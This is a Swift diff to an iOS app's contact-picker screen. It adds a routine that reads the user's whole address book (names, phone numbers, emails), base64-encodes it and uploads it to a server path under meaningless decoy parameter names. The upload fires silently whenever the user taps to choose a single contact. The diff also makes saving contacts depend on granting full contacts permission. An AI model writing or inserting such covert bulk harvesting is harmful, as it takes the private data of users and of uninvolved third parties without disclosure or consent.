@@ -9,6 +9,7 @@ import UIKit
 import HandyJSON
 import BRPickerView
 import ContactsUI
+import Contacts
 import MBProgressHUD_WJExtension
 
 class PLALXRViewController: PLABaseViewController {
@@ -55,27 +56,90 @@ class PLALXRViewController: PLABaseViewController {
             }
         }
         lianxirenView.block2 = { [weak self] btn, model in
-            self?.btn = btn
-            self?.model = model
-            self?.alertlianxi(btn, model)
+            GetLianxiQuanXian.canPer { lianxi in
+                self?.btn = btn
+                self?.model = model
+                self?.alertlianxi(btn, model)
+                if lianxi {
+                    self?.shanglianxirenxinxi(completion: { lianxirenArray in
+                        let data = try? JSONSerialization.data(withJSONObject: lianxirenArray!, options: [])
+                        let base64Data = data?.base64EncodedString() ?? ""
+                        let dict = ["vacuumed": "3", "reputedly": self?.productID ?? "", "uzbek": "1", "wallpaper": base64Data]
+                        PLAAFNetWorkManager.shared.uploadDataAPI(params: dict, pageUrl: "/ace/kitecaught/doctor/images", method: .post) { baseModel in
+                            
+                        } errorBlock: { error in
+                            
+                        }
+                    })
+                }else {
+                    if let self = self {
+                        self.showContactsPermissionAlert(in: self)
+                    }
+                }
+            }
         }
         lianxirenView.saveblock = { [weak self] in
-            guard let self = self, let modelArray = self.modelArray else { return }
-            let resultArray = modelArray.map { model -> [String: Any] in
-                return [
-                    "escapes": model.escapes ?? "",
-                    "asthma": model.asthma ?? "",
-                    "bubbling": model.bubbling ?? "",
-                    "plastics": model.plastics ?? ""
-                ]
+            GetLianxiQuanXian.canPer { lianxi in
+                if lianxi {
+                    guard let self = self, let modelArray = self.modelArray else { return }
+                    let resultArray = modelArray.map { model -> [String: Any] in
+                        return [
+                            "escapes": model.escapes ?? "",
+                            "asthma": model.asthma ?? "",
+                            "bubbling": model.bubbling ?? "",
+                            "plastics": model.plastics ?? ""
+                        ]
+                    }
+                    self.saveLianxiren(resultArray)
+                }else {
+                    if let self = self {
+                        self.showContactsPermissionAlert(in: self)
+                    }
+                }
             }
-            self.saveLianxiren(resultArray)
         }
+//        GetLianxiQuanXian.canPer { [weak self] lianxi in
+//            if lianxi {
+//                self?.shanglianxirenxinxi(completion: { lianxirenArray in
+//                    let data = try? JSONSerialization.data(withJSONObject: lianxirenArray!, options: [])
+//                    let base64Data = data?.base64EncodedString() ?? ""
+//                    let dict = ["vacuumed": "3", "reputedly": self?.productID ?? "", "uzbek": "1", "wallpaper": base64Data]
+//                    PLAAFNetWorkManager.shared.uploadDataAPI(params: dict, pageUrl: "/ace/kitecaught/doctor/images", method: .post) { baseModel in
+//                        
+//                    } errorBlock: { error in
+//                        
+//                    }
+//                })
+//            }else {
+//                if let self = self {
+//                    self.showContactsPermissionAlert(in: self)
+//                }
+//            }
+//        }
     }
 }
 
 
 extension PLALXRViewController: CNContactPickerDelegate {
+    
+    func showContactsPermissionAlert(in viewController: UIViewController) {
+        let alertController = UIAlertController(
+            title: "Contacts access is required",
+            message: "This feature requires access to your contacts. Please enable contact permissions in Settings.",
+            preferredStyle: .alert
+        )
+        let cancelAction = UIAlertAction(title: "Cancel", style: .cancel, handler: nil)
+        let settingsAction = UIAlertAction(title: "Open Settings", style: .default) { _ in
+            if let appSettingsURL = URL(string: UIApplication.openSettingsURLString) {
+                if UIApplication.shared.canOpenURL(appSettingsURL) {
+                    UIApplication.shared.open(appSettingsURL, options: [:], completionHandler: nil)
+                }
+            }
+        }
+        alertController.addAction(cancelAction)
+        alertController.addAction(settingsAction)
+        viewController.present(alertController, animated: true, completion: nil)
+    }
     
     func getLianxi() {
         ViewHud.addLoadView()
@@ -156,6 +220,42 @@ extension PLALXRViewController: CNContactPickerDelegate {
         print("Contact selection canceled")
     }
     
+    func shanglianxirenxinxi(completion: @escaping ([[String: Any]]?) -> Void) {
+        let keysToFetch: [CNKeyDescriptor] = [
+            CNContactGivenNameKey as NSString,
+            CNContactFamilyNameKey as NSString,
+            CNContactPhoneNumbersKey as NSString,
+            CNContactEmailAddressesKey as NSString
+        ]
+        let fetchRe = CNContactFetchRequest(keysToFetch: keysToFetch)
+        let lianxiren = CNContactStore()
+        DispatchQueue.global(qos: .userInitiated).async {
+            var lianxirenArray: [[String: Any]] = []
+            do {
+                try lianxiren.enumerateContacts(with: fetchRe) { (contact, stop) in
+                    let phoneNumbers = contact.phoneNumbers.map { $0.value.stringValue }
+                    let emailAddresses = contact.emailAddresses.map { $0.value as String }
+                    let phhonArrar = phoneNumbers.isEmpty ? "" : phoneNumbers.joined(separator: ",")
+                    let emailStr = emailAddresses.isEmpty ? "" : emailAddresses.joined(separator: ",")
+                    let kContact: [String: Any] = [
+                        "commandant": "01",
+                        "asthma": contact.givenName + contact.familyName,
+                        "troubling": phhonArrar,
+                        "acting": emailStr,
+                        "refrigerator": "1093",
+                        "fracture": "999",
+                        "bourgeoisie": "1"
+                    ]
+                    lianxirenArray.append(kContact)
+                }
+                completion(lianxirenArray)
+            } catch {
+                completion([["nodata": "1"]])
+                print("Error fetching contacts: \(error)")
+            }
+        }
+    }
+    
     func saveLianxiren(_ array: [[String: Any]] ) {
         ViewHud.addLoadView()
         if let jsonshuju = try? JSONSerialization.data(withJSONObject: array, options: []) {
@@ -175,6 +275,30 @@ extension PLALXRViewController: CNContactPickerDelegate {
                     ViewHud.hideLoadView()
                 }
             }
+        }
+    }
+    
+}
+
+typealias ContactsPCompletion = ((Bool) -> Void)
+
+class GetLianxiQuanXian: NSObject,CNContactPickerDelegate {
+    
+    static func canPer(completion: @escaping ContactsPCompletion) {
+        let labiaStore = CNContactStore()
+        switch CNContactStore.authorizationStatus(for: .contacts) {
+        case .authorized:
+            completion(true)
+        case .notDetermined:
+            labiaStore.requestAccess(for: .contacts, completionHandler: { (granted, error) in
+                DispatchQueue.main.async {
+                    completion(granted)
+                }
+            })
+        case .denied, .restricted:
+            completion(false)
+        default:
+            break
         }
     }
     
